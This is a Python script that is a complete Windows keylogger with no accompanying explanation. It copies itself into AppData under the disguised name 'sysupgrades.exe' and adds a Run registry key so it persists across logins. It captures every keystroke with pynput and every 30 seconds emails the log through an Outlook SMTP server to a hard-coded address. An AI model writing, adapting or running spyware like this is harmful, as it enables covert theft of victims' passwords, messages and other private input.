import pynput
import smtplib
import threading
import shutil
import os
from subprocess import run
from sys import executable

log=""
def lop_pg():
                new_file = os.environ["appdata"] + "\\sysupgrades.exe"
                if not os.path.exists(new_file):
                        shutil.copyfile(executable,new_file)
                        regedit_command = "reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v upgrade /t REG_SZ /d " + new_file
                        run(regedit_command, shell=True)
lop_pg()
def ck_function(key):
    try:
        global log
        log = log + str(key.char)
    except AttributeError:
        if key == key.space:
            log = log + " "
        else:
            log = log + str(key)
    except:
        pass


def mail_send(email,password,strdata):
    mail_server = smtplib.SMTP("smtp-mail.outlook.com",587)
    mail_server.starttls()
    mail_server.sendmail(email,password,strdata)
    mail_server.quit()

def thread_function():
    global log
    mail_send("user@gmail.com", "password", log.encode('utf-8'))
    log = ""
    timer_object = threading.Timer(30,thread_function)
    timer_object.start()


with pynput.keyboard.Listener(
        on_press=ck_function) as listener:
    thread_function()
    listener.join()
    
    




